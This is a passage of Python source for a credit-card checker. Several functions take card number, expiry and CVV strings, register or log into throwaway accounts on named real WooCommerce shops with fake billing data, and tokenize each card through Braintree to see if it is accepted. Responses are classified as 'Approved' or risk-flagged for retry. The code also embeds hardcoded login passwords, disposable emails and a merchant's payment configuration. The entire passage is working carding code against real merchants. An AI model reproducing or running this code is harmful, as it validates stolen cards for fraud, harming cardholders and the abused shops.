    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	data = {
    'billing_first_name': first_name,
    'billing_last_name': last_name,
    'billing_company': '',
    'billing_country': 'US',
    'wc_address_validation_postcode_lookup_postcode': '',
    'billing_address_1': street_address,
    'billing_address_2': '',
    'billing_postcode': zip_code,
    'billing_city': city,
    'billing_state': state,
    'billing_phone': num,
    'billing_email': acc,
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}
	
	response = r.post('https://thelittlekeepsakecompany.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	headers = {
	    'authority': 'thelittlekeepsakecompany.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'referer': 'https://thelittlekeepsakecompany.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://thelittlekeepsakecompany.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	
	
	
	headers = {
	    'authority': 'thelittlekeepsakecompany.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://thelittlekeepsakecompany.com',
    'referer': 'https://thelittlekeepsakecompany.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
}
		
	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}
		
	response = r.post('https://thelittlekeepsakecompany.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	
	enc = response.json()['data']
	
	dec = base64.b64decode(enc).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	
	
		
	headers = {
		    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}
		
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '63cd6242-6348-47de-9ced-9e74221c26ee',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
		
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		return
		
	
	
	headers = {
    'authority': 'thelittlekeepsakecompany.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://thelittlekeepsakecompany.com',
    'referer': 'https://thelittlekeepsakecompany.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

		
	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

		
	response = r.post('https://thelittlekeepsakecompany.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
				
			
		
		
		
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
			return 'Approved'
	else:
		return result
def sq(card):
	return 'Your card was declined.'
	
#Strip CH	
	

def st(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	acc = ['jabapaj169@givehit.com', 'sehawo9267@polatrix.com','paxibo6273@iteradev.com','vecero7501@segichen.com']
	email = random.choice(acc)
	user = user_agent.generate_user_agent()
	r = requests.session()
	headers = {'user-agent': user}
	response = r.post(
	    'https://atrantil.com/my-account/add-payment-method/', headers=headers)
	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
	data = {
    'username': email,
    'password': 'A@Amir5520055',
    'wpa_initiator': '',
    'alt_s': '',
    'udwsno9687': '828176',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
    'ct_bot_detector_event_token': 'bad77f24b9ad40433de7effd7f8a8ea7a9c0cdd28635f17c1337ffd7f1828aa4',
}
	
	response = r.post(
	    'https://atrantil.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'd251affb-6b72-4cfd-b93e-db6cb20bcd10',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': '323 E Pine St',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	headers = {'user-agent': user}
	
	data = {
	    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"4a22481c8661fe4dad5bbd95a7081548","fraud_merchant_id":null,"correlation_id":"c65afe459618e3fa0114dabd2c40d90a"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/h6nck7m2yyh6mqk4/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/h6nck7m2yyh6mqk4"},"merchantId":"h6nck7m2yyh6mqk4","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"h6nck7m2yyh6mqk4","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3333843690920608617","accessToken":"access_token$production$h6nck7m2yyh6mqk4$c17263feed9f66d5cc7e08f975927dd8","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"KBS Research","clientId":"AZ2WICgQ3fCYcNKRNgw9m3wd5_brlV542A4KeOL3mkkw11N4itXNyWxL_R7KGD0tX8Ssa3bEiyGG10gc","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"kbsresearch_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
    'ct_bot_detector_event_token': 'bad77f24b9ad40433de7effd7f8a8ea7a9c0cdd28635f17c1337ffd7f1828aa4',
    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjh9fQ==',
}
	
	response = r.post(
	    'https://atrantil.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def auth(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	
	r.follow_redirects = True
	
	r.verify = False


		
	def generate_full_name():
				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
				full_name = random.choice(first_names) + " " + random.choice(last_names)
				first_name, last_name = full_name.split()

				return first_name, last_name
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]

		return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
			
	corr = generate_random_code()
			
	sess = generate_random_code()
			
		
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/sign-in/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://shop.trifectanutrition.com/sign-up/', headers=headers)
	
	headers = {
	    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjE3MjQwNDciLCJhcCI6IjExMTczMzIxMDIiLCJpZCI6ImJkZDM1NWM4YWYyZjgzMDQiLCJ0ciI6ImZhM2I4ZDhmM2RlYTM0NDg1NDczMDkyZDIwYjIxMTFlIiwidGkiOjE3MjQxOTU1MDk1OTl9fQ==',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=1, i',
    'referer': 'https://shop.trifectanutrition.com/sign-up/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-fa3b8d8f3dea34485473092d20b2111e-bdd355c8af2f8304-01',
    'tracestate': '1724047@nr=0-1-1724047-1117332102-bdd355c8af2f8304----1724195509599',
    'user-agent': user,
}
	
	json_data = {
    'email': acc,
    'password': 'a5520055',
}
	
	response = r.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email', headers=headers, json=json_data)
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/account-settings/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
	'user-agent': user,
	}
	
	data = {
    'billing_first_name': first_name,
    'billing_last_name': last_name,
    'billing_country': 'US',
    'billing_address_1': street_address,
    'billing_address_2': '',
    'billing_city': city,
    'billing_state': state,
    'billing_postcode': zip_code,
    'billing_phone': num,
    'billing_email': acc,
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
    'save_address': 'Save address',
}
	
	response = r.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'priority': 'u=0, i',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://shop.trifectanutrition.com/my-account/add-payment-method', cookies=r.cookies, headers=headers)
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	
	
	
	headers = {
	    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjE3MjQwNDciLCJhcCI6IjExMTczMzIxMDIiLCJpZCI6ImJkOWZhODI1OTA4N2JmM2QiLCJ0ciI6ImM4ZmUxODU3ZDQ2OWE4M2E4MmExNTcxOTY0ZDQ1YTZjIiwidGkiOjE3MjQxOTU1NjE2NzR9fQ==',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=1, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-c8fe1857d469a83a82a1571964d45a6c-bd9fa8259087bf3d-01',
    'tracestate': '1724047@nr=0-1-1724047-1117332102-bd9fa8259087bf3d----1724195561674',
    'user-agent': user,
}
		
	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}
		
	response = r.post('https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	
	enc = response.json()['data']
	
	dec = base64.b64decode(enc).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	
	
		
	headers = {
		    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}
		
	json_data = {
		    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '95a6ff57-7691-4527-9e6a-dc6066499130',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
		
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		return
		
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://shop.trifectanutrition.com',
    'priority': 'u=0, i',
    'referer': 'https://shop.trifectanutrition.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

		
	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
		
	response = r.post('https://shop.trifectanutrition.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
				
			
		
		
		
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
			return 'Approved'
	else:
		return result
def ccx(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()


	headers={
'User-Agent': user,
}

	rrr=r.get("https://www.ecosmetics.com/my-account/add-payment-method/",headers=headers)
	login=re.findall(r'name="woocommerce-register-nonce" value="(.*?)"',rrr.text)[0]



	
	








	headers={
'User-Agent': user,
}

	data = {
    'email': email,
    'password': email,
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
